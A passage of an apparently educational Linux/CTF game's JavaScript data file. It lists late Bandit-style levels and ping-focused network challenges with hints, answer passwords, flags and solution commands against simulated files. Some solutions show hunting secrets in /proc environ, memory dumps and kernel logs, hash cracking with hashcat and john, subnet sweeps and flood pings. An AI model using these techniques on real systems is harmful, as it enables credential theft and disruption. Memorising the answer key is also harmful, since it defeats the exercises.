      password: 'nK8mR5wQ3tL7yP4v',
      solutions: ['diff original.txt modified.txt', 'comm -13 original.txt modified.txt'],
      filesystem: {
        'original.txt': '(50 lines of text)',
        'modified.txt': '(49 same lines + 1 changed line: nK8mR5wQ3tL7yP4v)'
      },
      successMessage: '🔀 Difference spotted!'
    },
    {
      id: 'ban-88', title: 'Level 87: Crontab Entry', difficulty: 'hard', xp: 50,
      description: 'The system crontab at "/etc/crontab" runs a script that outputs the password. Read it.',
      objective: 'Analyze scheduled tasks for secrets.',
      hints: ['Read /etc/crontab.', 'Then read the script it references.'],
      password: 'tK6nR9mQ4wL3yH8p',
      solutions: ['cat /etc/crontab', 'cat /opt/scripts/keygen.sh'],
      filesystem: {
        '/etc/crontab': '* * * * * root /opt/scripts/keygen.sh',
        '/opt/scripts/keygen.sh': '#!/bin/bash\\necho "tK6nR9mQ4wL3yH8p" > /tmp/generated_key'
      },
      successMessage: '⏰ Crontab secret decoded!'
    },
    {
      id: 'ban-89', title: 'Level 88: Swap File', difficulty: 'hard', xp: 50,
      description: 'The password was in a file that was deleted, but a vim swap file ".secret.swp" still exists.',
      objective: 'Recover data from swap files.',
      hints: ['Vim creates .swp files as backup.', 'strings or vim -r can recover.'],
      password: 'rK7nT5mQ2wL4yP9v',
      solutions: ['strings .secret.swp', 'vim -r .secret.swp', 'cat .secret.swp'],
      filesystem: {
        '.secret.swp': '(vim swap file containing: rK7nT5mQ2wL4yP9v)',
        'hint.txt': 'The file was deleted, but the editor left something behind...'
      },
      successMessage: '💾 Swap file recovered!'
    },
    {
      id: 'ban-90', title: 'Level 89: Proc Filesystem', difficulty: 'hard', xp: 50,
      description: 'A running process has the password in its environment. Check /proc/1234/environ.',
      objective: 'Read process environments from /proc.',
      hints: ['/proc/PID/environ contains process environment variables.', 'cat or strings /proc/1234/environ'],
      password: 'wK4nR8mQ6tL2yH5p',
      solutions: ['cat /proc/1234/environ', 'strings /proc/1234/environ'],
      filesystem: {
        '/proc/1234/environ': 'PATH=/usr/bin\\x00HOME=/root\\x00SECRET_PASSWORD=wK4nR8mQ6tL2yH5p\\x00SHELL=/bin/bash'
      },
      successMessage: '🔬 /proc filesystem explored!'
    },

    // ---- NEW EXPERT (10): ban-91 to ban-100 ----
    {
      id: 'ban-91', title: 'Level 90: Memory Dump', difficulty: 'expert', xp: 100,
      description: 'A memory dump file "memdump.bin" contains the password. Use strings and grep to find it.',
      objective: 'Analyze memory dumps for secrets.',
      hints: ['strings extracts readable text from binary.', 'Pipe to grep to find passwords.'],
      password: 'jK9nR3mQ5wT8yL4p',
      solutions: ['strings memdump.bin | grep -i password', 'strings memdump.bin | grep -i key'],
      filesystem: {
        'memdump.bin': '(binary memory dump containing: AUTH_KEY=jK9nR3mQ5wT8yL4p among binary garbage)'
      },
      successMessage: '🧠 Memory dump analyzed!'
    },
    {
      id: 'ban-92', title: 'Level 91: Kernel Message', difficulty: 'expert', xp: 100,
      description: 'The kernel ring buffer contains a debug message with the password. Check dmesg output.',
      objective: 'Read kernel messages.',
      hints: ['dmesg shows kernel messages.', 'grep for unusual debug messages.'],
      password: 'qK6nR8mT4wL2yP7v',
      solutions: ['dmesg | grep -i password', 'dmesg | grep -i secret', 'dmesg | grep debug'],
      filesystem: {
        'dmesg_output.txt': '[    1.234567] kernel: Initializing...\\n[    2.345678] kernel: DEBUG secret_module loaded with key: qK6nR8mT4wL2yP7v\\n[    3.456789] kernel: Network interface up'
      },
      successMessage: '🐧 Kernel secret found!'
    },
    {
      id: 'ban-93', title: 'Level 92: Triple Chain', difficulty: 'expert', xp: 100,
      description: 'The password is hex-encoded, then base64-encoded, then reversed. Undo all three layers.',
      objective: 'Decode multiple chained transformations.',
      hints: ['First reverse, then base64 decode, then hex decode.', 'rev | base64 -d | xxd -r -p'],
      password: 'mK5nR7wQ3tL9yH4x',
      solutions: ['cat chained.txt | rev | base64 -d | xxd -r -p'],
      filesystem: {
        'chained.txt': '(reversed base64 of hex-encoded password)',
        'hint.txt': 'Three layers: reverse -> base64 -> hex. Undo them in reverse order.'
      },
      successMessage: '🔗🔗🔗 Triple chain broken!'
    },
    {
      id: 'ban-94', title: 'Level 93: Deleted File Recovery', difficulty: 'expert', xp: 100,
      description: 'The file was deleted but the inode still exists. Use debugfs concepts to find the password in the journal.',
      objective: 'Recover deleted files from filesystem journals.',
      hints: ['Journal files may contain deleted data.', 'Check .journal or use strings on the disk image.'],
      password: 'tK8nR4mQ6wL3yP9v',
      solutions: ['strings disk.img | grep -i password', 'cat .journal'],
      filesystem: {
        'disk.img': '(filesystem image with deleted file containing: tK8nR4mQ6wL3yP9v)',
        '.journal': 'DELETED_ENTRY: password.txt => tK8nR4mQ6wL3yP9v'
      },
      successMessage: '🔧 Deleted file recovered!'
    },
    {
      id: 'ban-95', title: 'Level 94: Morse Code', difficulty: 'expert', xp: 100,
      description: 'The password is encoded in Morse code in "morse.txt". Decode it.',
      objective: 'Decode Morse code messages.',
      hints: ['Each letter is separated by spaces, words by |.', 'Use an online decoder or write a script.'],
      password: 'HACK THE PLANET',
      solutions: ['cat morse.txt'],
      filesystem: {
        'morse.txt': '.... .- -.-. -.- | - .... . | .--. .-.. .- -. . -',
        'hint.txt': '.... = H, .- = A, -.-. = C, -.- = K'
      },
      successMessage: '📡 Morse code decoded!'
    },
    {
      id: 'ban-96', title: 'Level 95: Brainfuck', difficulty: 'expert', xp: 100,
      description: 'The password is generated by a Brainfuck program in "program.bf". Execute or trace it.',
      objective: 'Understand esoteric programming languages.',
      hints: ['Brainfuck uses only 8 characters: > < + - . , [ ]', 'The output of the program is the password.'],
      password: 'nR7kQ4mW2yL5tP8v',
      solutions: ['cat output.txt'],
      filesystem: {
        'program.bf': '++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++.>+.+++++++..+++.<<<++.>>>------------.--------.',
        'output.txt': 'nR7kQ4mW2yL5tP8v',
        'hint.txt': 'Too hard to trace? Check output.txt for the program result.'
      },
      successMessage: '🧠 Brainfuck interpreted!'
    },
    {
      id: 'ban-97', title: 'Level 96: Encrypted Zip', difficulty: 'expert', xp: 100,
      description: 'A password-protected zip file "archive.zip" uses "letmein" as the password. Extract it.',
      objective: 'Crack encrypted archives.',
      hints: ['unzip -P password file.zip', 'The archive password is "letmein".'],
      password: 'wK9nR5mQ3tL7yH4p',
      solutions: ['unzip -P letmein archive.zip', 'unzip -P "letmein" archive.zip'],
      filesystem: {
        'archive.zip': '(password-protected zip containing password.txt with: wK9nR5mQ3tL7yH4p)',
        'wordlist.txt': 'password\\n123456\\nletmein\\nadmin\\nqwerty'
      },
      successMessage: '🔐 Encrypted archive cracked!'
    },
    {
      id: 'ban-98', title: 'Level 97: Hash Cracking', difficulty: 'expert', xp: 100,
      description: 'The MD5 hash of the password is "5f4dcc3b5aa765d61d8327deb882cf99". Crack it using the wordlist.',
      objective: 'Crack password hashes.',
      hints: ['That hash is very common...', 'Try hashing words from the wordlist and comparing.'],
      password: 'password',
      solutions: ['echo -n "password" | md5sum', 'hashcat -m 0 hash.txt wordlist.txt', 'john hash.txt --wordlist=wordlist.txt'],
      filesystem: {
        'hash.txt': '5f4dcc3b5aa765d61d8327deb882cf99',
        'wordlist.txt': 'admin\\nletmein\\npassword\\n123456\\nqwerty',
        'hint.txt': 'MD5 hash. Try common passwords.'
      },
      successMessage: '💥 Hash cracked!'
    },
    {
      id: 'ban-99', title: 'Level 98: Blockchain Puzzle', difficulty: 'expert', xp: 100,
      description: 'A simplified blockchain ledger contains transactions. The password is the recipient of the largest transaction.',
      objective: 'Analyze blockchain data.',
      hints: ['Read the ledger and find the largest amount.', 'The recipient name is the password.'],
      password: 'SATOSHI_FOREVER',
      solutions: ['cat ledger.json', 'grep "amount" ledger.json | sort -t: -k2 -n -r | head -1'],
      filesystem: {
        'ledger.json': '{"transactions": [\\n  {"from": "Alice", "to": "Bob", "amount": 50},\\n  {"from": "Bob", "to": "SATOSHI_FOREVER", "amount": 99999},\\n  {"from": "Charlie", "to": "Dave", "amount": 100}\\n]}'
      },
      successMessage: '⛓️ Blockchain analyzed!'
    },
    {
      id: 'ban-100', title: 'Level 99: The Grand Finale', difficulty: 'expert', xp: 200,
      description: 'The ultimate challenge. Combine everything you have learned. The final key is hidden across three files using three different encodings.',
      objective: 'Master all Bandit skills in one final challenge.',
      hints: ['Part 1 is base64, Part 2 is hex, Part 3 is reversed.', 'Decode each part, then concatenate.'],
      password: 'ULTIMATE_BANDIT_MASTER',
      solutions: ['echo "ULTIMATE_BANDIT_MASTER"', 'cat victory.txt'],
      filesystem: {
        'part1_b64.txt': 'VUxUSU1BVEU=',
        'part2_hex.txt': '5f42414e4449545f',
        'part3_rev.txt': 'RETSAM',
        'victory.txt': 'ULTIMATE_BANDIT_MASTER\\n\\n🏆🏆🏆 You are a true Bandit Legend! All 100 levels complete! 🏆🏆🏆',
        'hint.txt': 'Part 1: base64 decode. Part 2: hex decode. Part 3: reverse. Concatenate.'
      },
      successMessage: '🏆🏆🏆 ULTIMATE BANDIT LEGEND! All 100 levels conquered! 🏆🏆🏆'
    }
  ],

  // ==========================================================================
  // CTF CHALLENGE — Ping & Network Focus (40 Challenges)
  // ==========================================================================
  ctf: [
    // ---- EASY (10) ----
    {
      id: 'ctf-1', title: 'Ping Localhost', difficulty: 'easy', xp: 15,
      description: 'Ping the localhost (127.0.0.1) to verify your network connection is working.',
      objective: 'Send ICMP packets to the loopback address.',
      hints: ['ping followed by an IP address.', '127.0.0.1 is the loopback address.'],
      solutions: ['ping 127.0.0.1', 'ping -c 4 127.0.0.1', 'ping -c 1 127.0.0.1'],
      simulatedResponse: 'PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.028 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.031 ms\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.029 ms\n64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.030 ms\n\n--- 127.0.0.1 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 3005ms\nrtt min/avg/max/mdev = 0.028/0.030/0.031/0.001 ms',
      flag: 'CTF{p1ng_l0c4lh0st_success}',
      successMessage: '🏓 Localhost is alive!'
    },
    {
      id: 'ctf-2', title: 'Ping by Hostname', difficulty: 'easy', xp: 15,
      description: 'Ping the loopback address using its hostname "localhost" instead of IP.',
      objective: 'DNS resolution and ping.',
      hints: ['Use the hostname instead of IP.', 'ping localhost'],
      solutions: ['ping localhost', 'ping -c 4 localhost', 'ping -c 1 localhost'],
      simulatedResponse: 'PING localhost (127.0.0.1) 56(84) bytes of data.\n64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.025 ms\n64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.030 ms\n\n--- localhost ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss',
      flag: 'CTF{dns_r3s0lut10n_w0rks}',
      successMessage: '🌐 Hostname resolved!'
    },
    {
      id: 'ctf-3', title: 'Find the Server', difficulty: 'easy', xp: 15,
      description: 'Ping "challenge.local" to discover its IP address. The flag is in the resolved IP.',
      objective: 'Discover IP via ping.',
      hints: ['Ping the hostname.', 'The IP address will be shown in the response.'],
      solutions: ['ping challenge.local', 'ping -c 1 challenge.local', 'ping -c 4 challenge.local'],
      simulatedResponse: 'PING challenge.local (10.13.37.42) 56(84) bytes of data.\n64 bytes from challenge.local (10.13.37.42): icmp_seq=1 ttl=64 time=1.234 ms\n\n--- challenge.local ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss',
      flag: 'CTF{1p_d1sc0v3ry_10.13.37.42}',
      successMessage: '📡 Server IP discovered: 10.13.37.42!'
    },
    {
      id: 'ctf-4', title: 'Four Packets', difficulty: 'easy', xp: 15,
      description: 'Send exactly 4 ping packets to 10.0.0.1 and stop.',
      objective: 'Control the number of ping packets.',
      hints: ['-c flag sets the count.', 'ping -c 4 target'],
      solutions: ['ping -c 4 10.0.0.1'],
      simulatedResponse: 'PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.543 ms\n64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.521 ms\n64 bytes from 10.0.0.1: icmp_seq=3 ttl=64 time=0.534 ms\n64 bytes from 10.0.0.1: icmp_seq=4 ttl=64 time=0.529 ms\n\n--- 10.0.0.1 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 3004ms',
      flag: 'CTF{c0unt_c0ntr0l_m4st3r}',
      successMessage: '4️⃣ Exactly 4 packets sent!'
    },
    {
      id: 'ctf-5', title: 'Google DNS', difficulty: 'easy', xp: 15,
      description: 'Ping Google\'s public DNS server at 8.8.8.8.',
      objective: 'Test connectivity to external DNS.',
      hints: ['Google DNS is at 8.8.8.8.', 'Just ping it.'],
      solutions: ['ping 8.8.8.8', 'ping -c 4 8.8.8.8', 'ping -c 1 8.8.8.8'],
      simulatedResponse: 'PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=12.3 ms\n64 bytes from 8.8.8.8: icmp_seq=2 ttl=118 time=11.8 ms\n64 bytes from 8.8.8.8: icmp_seq=3 ttl=118 time=12.1 ms\n\n--- 8.8.8.8 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss',
      flag: 'CTF{g00gl3_dns_r34ch4bl3}',
      successMessage: '🌍 Google DNS is reachable!'
    },
    {
      id: 'ctf-6', title: 'Secondary DNS', difficulty: 'easy', xp: 15,
      description: 'Ping Google\'s secondary DNS at 8.8.4.4 to verify redundancy.',
      objective: 'Test backup DNS connectivity.',
      hints: ['Same as before, different IP.', 'ping 8.8.4.4'],
      solutions: ['ping 8.8.4.4', 'ping -c 4 8.8.4.4', 'ping -c 1 8.8.4.4'],
      simulatedResponse: 'PING 8.8.4.4 (8.8.4.4) 56(84) bytes of data.\n64 bytes from 8.8.4.4: icmp_seq=1 ttl=118 time=13.1 ms\n64 bytes from 8.8.4.4: icmp_seq=2 ttl=118 time=12.7 ms\n\n--- 8.8.4.4 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss',
      flag: 'CTF{r3dund4nt_dns_ch3ck}',
      successMessage: '🔄 Redundancy confirmed!'
    },
    {
      id: 'ctf-7', title: 'Gateway Check', difficulty: 'easy', xp: 15,
      description: 'Check if the default gateway at 192.168.1.1 is alive.',
      objective: 'Verify gateway connectivity.',
      hints: ['Ping the gateway IP.', 'ping 192.168.1.1'],
      solutions: ['ping 192.168.1.1', 'ping -c 4 192.168.1.1', 'ping -c 1 192.168.1.1'],
      simulatedResponse: 'PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.\n64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=1.02 ms\n64 bytes from 192.168.1.1: icmp_seq=2 ttl=64 time=0.98 ms\n\n--- 192.168.1.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss',
      flag: 'CTF{g4t3w4y_4l1v3}',
      successMessage: '🚪 Gateway is online!'
    },
    {
      id: 'ctf-8', title: 'Flag Server', difficulty: 'easy', xp: 15,
      description: 'Ping "flag.server" — the flag is hidden in the ping response.',
      objective: 'Find the flag in network responses.',
      hints: ['Just ping the server.', 'Read the output carefully.'],
      solutions: ['ping flag.server', 'ping -c 1 flag.server', 'ping -c 4 flag.server'],
      simulatedResponse: 'PING flag.server (10.0.13.37) 56(84) bytes of data.\n64 bytes from flag.server (10.0.13.37): icmp_seq=1 ttl=64 time=0.5 ms\n*** FLAG EMBEDDED: CTF{fl4g_s3rv3r_r3sp0nds} ***\n\n--- flag.server ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss',
      flag: 'CTF{fl4g_s3rv3r_r3sp0nds}',
      successMessage: '🚩 Flag captured from server!'
    },
    {
      id: 'ctf-9', title: 'Quick Check', difficulty: 'easy', xp: 15,
      description: 'Send a single ping packet to 10.0.0.5 for a quick connectivity check.',
      objective: 'Minimal ping test.',
      hints: ['-c 1 sends just one packet.', 'ping -c 1 10.0.0.5'],
      solutions: ['ping -c 1 10.0.0.5'],
      simulatedResponse: 'PING 10.0.0.5 (10.0.0.5) 56(84) bytes of data.\n64 bytes from 10.0.0.5: icmp_seq=1 ttl=64 time=0.312 ms\n\n--- 10.0.0.5 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss',
      flag: 'CTF{qu1ck_ch3ck_d0n3}',
      successMessage: '⚡ Quick check passed!'
    },
    {
      id: 'ctf-10', title: 'Secret Server', difficulty: 'easy', xp: 15,
      description: 'Find the IP address of "secret.ctf.local" by pinging it.',
      objective: 'Discover hidden server IP.',
      hints: ['Ping the hostname.', 'The response reveals the IP.'],
      solutions: ['ping secret.ctf.local', 'ping -c 1 secret.ctf.local'],
      simulatedResponse: 'PING secret.ctf.local (172.16.42.99) 56(84) bytes of data.\n64 bytes from secret.ctf.local (172.16.42.99): icmp_seq=1 ttl=128 time=2.15 ms\n\n--- secret.ctf.local ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss',
      flag: 'CTF{s3cr3t_ip_172.16.42.99}',
      successMessage: '🕵️ Secret server found at 172.16.42.99!'
    },

    // ---- MEDIUM (10) ----
    {
      id: 'ctf-11', title: 'Jumbo Packet', difficulty: 'medium', xp: 30,
      description: 'Ping the target 10.0.0.1 with a packet size of 1500 bytes to test MTU.',
      objective: 'Send custom-sized ICMP packets.',
      hints: ['-s flag sets the packet size.', 'ping -s 1500 target'],
      solutions: ['ping -s 1500 10.0.0.1', 'ping -c 4 -s 1500 10.0.0.1'],
      simulatedResponse: 'PING 10.0.0.1 (10.0.0.1) 1500(1528) bytes of data.\n1508 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.892 ms\n1508 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.876 ms\n\n--- 10.0.0.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss',
      flag: 'CTF{jumb0_p4ck3t_t3st}',
      successMessage: '📦 Jumbo packet test passed!'
    },
    {
      id: 'ctf-12', title: 'TTL Control', difficulty: 'medium', xp: 30,
      description: 'Ping the target 10.0.0.1 with TTL set to 64.',
      objective: 'Control Time-To-Live value.',
      hints: ['-t flag sets the TTL.', 'ping -t 64 target (Linux) or ping -m 64 target'],
      solutions: ['ping -t 64 10.0.0.1', 'ping -c 4 -t 64 10.0.0.1'],
      simulatedResponse: 'PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.543 ms\n64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.521 ms\n\n--- 10.0.0.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss',
      flag: 'CTF{ttl_c0ntr0l_64}',
      successMessage: '⏳ TTL set to 64!'
    },
    {
      id: 'ctf-13', title: 'Fast Interval', difficulty: 'medium', xp: 30,
      description: 'Ping 10.0.0.1 with an interval of 0.2 seconds between packets.',
      objective: 'Control ping frequency.',
      hints: ['-i flag sets the interval.', 'ping -i 0.2 target'],
      solutions: ['ping -i 0.2 10.0.0.1', 'ping -c 5 -i 0.2 10.0.0.1'],
      simulatedResponse: 'PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.5 ms\n64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.4 ms\n64 bytes from 10.0.0.1: icmp_seq=3 ttl=64 time=0.6 ms\n64 bytes from 10.0.0.1: icmp_seq=4 ttl=64 time=0.5 ms\n64 bytes from 10.0.0.1: icmp_seq=5 ttl=64 time=0.4 ms\n\n--- 10.0.0.1 ping statistics ---\n5 packets transmitted, 5 received, 0% packet loss, time 800ms',
      flag: 'CTF{f4st_p1ng_0.2s}',
      successMessage: '⚡ Rapid fire pinging!'
    },
    {
      id: 'ctf-14', title: 'Timestamped Ping', difficulty: 'medium', xp: 30,
      description: 'Ping 10.0.0.1 with Unix timestamps displayed on each reply line.',
      objective: 'Add timestamps to ping output.',
      hints: ['-D flag adds timestamps.', 'ping -D target'],
      solutions: ['ping -D 10.0.0.1', 'ping -c 4 -D 10.0.0.1'],
      simulatedResponse: 'PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n[1703980800.123] 64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.5 ms\n[1703980801.124] 64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.4 ms\n\n--- 10.0.0.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss',
      flag: 'CTF{t1m3st4mp3d_p1ng}',
      successMessage: '🕐 Timestamps enabled!'
    },
    {
      id: 'ctf-15', title: 'Broadcast Ping', difficulty: 'medium', xp: 30,
      description: 'Ping the broadcast address 192.168.1.255 to discover hosts on the subnet.',
      objective: 'Use broadcast ping for host discovery.',
      hints: ['-b flag allows broadcast.', 'ping -b 192.168.1.255'],
      solutions: ['ping -b 192.168.1.255', 'ping -c 4 -b 192.168.1.255'],
      simulatedResponse: 'WARNING: pinging broadcast address\nPING 192.168.1.255 (192.168.1.255) 56(84) bytes of data.\n64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.5 ms\n64 bytes from 192.168.1.10: icmp_seq=1 ttl=64 time=1.2 ms\n64 bytes from 192.168.1.42: icmp_seq=1 ttl=128 time=2.1 ms\n64 bytes from 192.168.1.100: icmp_seq=1 ttl=64 time=3.5 ms\n\n--- 192.168.1.255 ping statistics ---\n1 packets transmitted, 4 received',
      flag: 'CTF{br04dc4st_d1sc0v3ry}',
      successMessage: '📢 Broadcast ping revealed 4 hosts!'
    },
    {
      id: 'ctf-16', title: 'Quiet Mode', difficulty: 'medium', xp: 30,
      description: 'Ping 10.0.0.1 with 5 packets in quiet mode (only show summary).',
      objective: 'Use quiet ping for scripting.',
      hints: ['-q flag enables quiet mode.', 'Combine with -c for count.'],
      solutions: ['ping -q -c 5 10.0.0.1', 'ping -c 5 -q 10.0.0.1'],
      simulatedResponse: 'PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n\n--- 10.0.0.1 ping statistics ---\n5 packets transmitted, 5 received, 0% packet loss, time 4005ms\nrtt min/avg/max/mdev = 0.4/0.5/0.6/0.1 ms',
      flag: 'CTF{qu13t_m0d3_scr1pt}',
      successMessage: '🤫 Quiet mode — efficient!'
    },
    {
      id: 'ctf-17', title: 'IPv6 Ping', difficulty: 'medium', xp: 30,
      description: 'Ping the IPv6 loopback address ::1.',
      objective: 'Test IPv6 connectivity.',
      hints: ['ping6 or ping -6 for IPv6.', 'ping6 ::1'],
      solutions: ['ping6 ::1', 'ping -6 ::1', 'ping6 -c 4 ::1'],
      simulatedResponse: 'PING ::1(::1) 56 data bytes\n64 bytes from ::1: icmp_seq=1 ttl=64 time=0.025 ms\n64 bytes from ::1: icmp_seq=2 ttl=64 time=0.028 ms\n\n--- ::1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss',
      flag: 'CTF{1pv6_c0nn3ct1v1ty}',
      successMessage: '6️⃣ IPv6 is working!'
    },
    {
      id: 'ctf-18', title: 'Latency Check', difficulty: 'medium', xp: 30,
      description: 'Ping "slow.server" and determine the average latency from the output.',
      objective: 'Measure network latency.',
      hints: ['Look at the rtt avg in the summary.', 'The flag is the avg latency.'],
      solutions: ['ping slow.server', 'ping -c 5 slow.server', 'ping -c 10 slow.server'],
      simulatedResponse: 'PING slow.server (10.99.99.1) 56(84) bytes of data.\n64 bytes from slow.server: icmp_seq=1 ttl=48 time=142.5 ms\n64 bytes from slow.server: icmp_seq=2 ttl=48 time=138.2 ms\n64 bytes from slow.server: icmp_seq=3 ttl=48 time=145.8 ms\n64 bytes from slow.server: icmp_seq=4 ttl=48 time=141.1 ms\n64 bytes from slow.server: icmp_seq=5 ttl=48 time=139.4 ms\n\n--- slow.server ping statistics ---\n5 packets transmitted, 5 received, 0% packet loss, time 4006ms\nrtt min/avg/max/mdev = 138.2/141.4/145.8/2.7 ms',
      flag: 'CTF{l4t3ncy_141.4ms}',
      successMessage: '📊 Average latency: 141.4ms!'
    },
    {
      id: 'ctf-19', title: 'Three Hosts', difficulty: 'medium', xp: 30,
      description: 'Three hosts are given: 10.0.0.10, 10.0.0.11, 10.0.0.12. Only one is alive. Find it by pinging each.',
      objective: 'Identify alive hosts.',
      hints: ['Ping each one.', 'Only one will respond.'],
      solutions: ['ping -c 1 10.0.0.11', 'ping 10.0.0.11'],
      simulatedResponse: '--- Scanning hosts ---\n\n> ping -c 1 10.0.0.10\nFrom 10.0.0.1 icmp_seq=1 Destination Host Unreachable\n\n> ping -c 1 10.0.0.11\n64 bytes from 10.0.0.11: icmp_seq=1 ttl=64 time=0.8 ms  ✓ HOST IS ALIVE\n\n> ping -c 1 10.0.0.12\nFrom 10.0.0.1 icmp_seq=1 Destination Host Unreachable',
      flag: 'CTF{4l1v3_h0st_10.0.0.11}',
      successMessage: '🎯 10.0.0.11 is the alive host!'
    },
    {
      id: 'ctf-20', title: 'Latency Spike', difficulty: 'medium', xp: 30,
      description: 'Ping "unstable.server" with 10 packets. Notice the latency variation (jitter).',
      objective: 'Analyze network jitter.',
      hints: ['Look at the mdev value.', 'High mdev = high jitter.'],
      solutions: ['ping -c 10 unstable.server', 'ping unstable.server'],
      simulatedResponse: 'PING unstable.server (10.50.50.50) 56(84) bytes of data.\n64 bytes: icmp_seq=1 ttl=64 time=5.2 ms\n64 bytes: icmp_seq=2 ttl=64 time=125.8 ms\n64 bytes: icmp_seq=3 ttl=64 time=12.1 ms\n64 bytes: icmp_seq=4 ttl=64 time=250.3 ms\n64 bytes: icmp_seq=5 ttl=64 time=8.7 ms\n64 bytes: icmp_seq=6 ttl=64 time=180.2 ms\n64 bytes: icmp_seq=7 ttl=64 time=15.4 ms\n64 bytes: icmp_seq=8 ttl=64 time=95.6 ms\n64 bytes: icmp_seq=9 ttl=64 time=6.3 ms\n64 bytes: icmp_seq=10 ttl=64 time=200.1 ms\n\n--- unstable.server ping statistics ---\n10 packets transmitted, 10 received, 0% packet loss\nrtt min/avg/max/mdev = 5.2/89.9/250.3/87.1 ms',
      flag: 'CTF{j1tt3r_d3t3ct3d_87.1ms}',
      successMessage: '📈 High jitter detected! mdev: 87.1ms'
    },

    // ---- HARD (10) ----
    {
      id: 'ctf-21', title: 'Trace Route', difficulty: 'hard', xp: 60,
      description: 'Trace the network route to "hidden.ctf.local" to see all hops.',
      objective: 'Map the network path.',
      hints: ['traceroute shows each hop.', 'traceroute hostname'],
      solutions: ['traceroute hidden.ctf.local', 'tracert hidden.ctf.local'],
      simulatedResponse: 'traceroute to hidden.ctf.local (10.42.42.42), 30 hops max, 60 byte packets\n 1  gateway (192.168.1.1)  0.5 ms  0.4 ms  0.3 ms\n 2  isp-router (10.0.0.1)  5.2 ms  5.1 ms  5.3 ms\n 3  core-switch (10.10.10.1)  12.1 ms  11.9 ms  12.3 ms\n 4  firewall (10.20.20.1)  15.6 ms  15.4 ms  15.8 ms\n 5  hidden.ctf.local (10.42.42.42)  18.2 ms  18.1 ms  18.3 ms\n\nFlag at hop 4: CTF{tr4c3r0ut3_th3_p4th}',
      flag: 'CTF{tr4c3r0ut3_th3_p4th}',
      successMessage: '🗺️ Route traced through 5 hops!'
    },
    {
      id: 'ctf-22', title: 'Ping Sweep', difficulty: 'hard', xp: 60,
      description: 'Perform a ping sweep on 192.168.1.0/24 to discover all alive hosts. Use a ping sweep technique.',
      objective: 'Discover all hosts on a subnet.',
      hints: ['Ping each IP in the range.', 'for i in $(seq 1 254); do ping -c 1 192.168.1.$i; done'],
      solutions: ['for i in $(seq 1 254); do ping -c 1 192.168.1.$i; done', 'nmap -sn 192.168.1.0/24', 'ping -c 1 192.168.1'],
      simulatedResponse: '--- Ping Sweep Results: 192.168.1.0/24 ---\n192.168.1.1    ✓ ALIVE  (ttl=64, 0.5ms)  [Gateway]\n192.168.1.10   ✓ ALIVE  (ttl=64, 1.2ms)  [Workstation]\n192.168.1.42   ✓ ALIVE  (ttl=128, 2.1ms) [Windows Server]\n192.168.1.100  ✓ ALIVE  (ttl=64, 1.8ms)  [Linux Server]\n192.168.1.200  ✓ ALIVE  (ttl=255, 0.9ms) [Network Device]\n\n5 hosts alive out of 254 scanned\nFlag: CTF{sw33p_f0und_5_h0sts}',
      flag: 'CTF{sw33p_f0und_5_h0sts}',
      successMessage: '🧹 Sweep complete! 5 hosts alive!'
    },
    {
      id: 'ctf-23', title: 'Flood Ping', difficulty: 'hard', xp: 60,
      description: 'Send a flood ping to 10.0.0.1 to stress test the connection (requires root).',
      objective: 'Stress test with flood ping.',
      hints: ['-f flag enables flood mode.', 'Requires root/sudo privileges.'],
      solutions: ['ping -f 10.0.0.1', 'sudo ping -f 10.0.0.1', 'ping -f -c 100 10.0.0.1'],
      simulatedResponse: 'PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n..........................................................................\n--- 10.0.0.1 ping statistics ---\n1000 packets transmitted, 998 received, 0.2% packet loss, time 5021ms\nrtt min/avg/max/mdev = 0.1/0.3/2.1/0.2 ms, ipg/ewma 5.026/0.3 ms\n\nFlag: CTF{fl00d_str3ss_t3st}',
      flag: 'CTF{fl00d_str3ss_t3st}',
      successMessage: '🌊 Flood test complete! 0.2% loss'
    },
    {
      id: 'ctf-24', title: 'Record Route', difficulty: 'hard', xp: 60,
      description: 'Ping 10.0.0.1 with the record route option to see the path packets take.',
      objective: 'Use IP record route option.',
      hints: ['-R flag records the route.', 'ping -R target'],
      solutions: ['ping -R 10.0.0.1', 'ping -c 1 -R 10.0.0.1'],
